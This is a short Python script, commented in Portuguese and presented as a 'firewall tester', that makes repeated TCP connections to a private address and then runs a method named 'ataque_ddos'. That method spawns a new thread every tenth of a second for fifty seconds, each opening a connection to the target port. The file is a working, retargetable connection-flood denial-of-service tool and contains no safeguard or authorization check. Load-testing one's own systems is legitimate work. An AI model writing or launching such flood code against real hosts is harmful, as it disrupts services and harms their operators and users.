import socket
import time
import threading

class TestadorFirewall:
    def __init__(self, target_ip, target_port, attempts, attack_duration):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attempts = attempts
        self.attack_duration = attack_duration

    def tentar_conexao(self, attempt_number):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.target_ip, self.target_port))
                print(f" Tentativa {attempt_number}: Conexão bem-sucedida com {self.target_ip}:{self.target_port}")
                s.close()
        except Exception as e:
            print(f" Tentativa {attempt_number}: Falha na conexão - {e}")

    def ataque_ddos(self):
        end_time = time.time() + self.attack_duration
        attempt_number = 0
        
        while time.time() < end_time:
            attempt_number += 1
            threading.Thread(target=self.tentar_conexao, args=(attempt_number,)).start()
            time.sleep(0.1)  # Atraso para evitar sobrecarga excessiva

    def iniciar_testes(self):
        print(" Iniciando testes de conexão...")
        for i in range(self.attempts):
            self.tentar_conexao(i + 1)
        
        print(" Iniciando ataque DDoS...")
        self.ataque_ddos()

# Exemplo de uso
if __name__ == "__main__":
    target_ip = "192.168.18.11"  # Alvo do teste
    target_port = 80            # Porta do alvo
    attempts = 15                 # Número de tentativas de conexão
    attack_duration = 50          # Duração do ataque DDoS em segundos

    testador = TestadorFirewall(target_ip, target_port, attempts, attack_duration)
    testador.iniciar_testes()
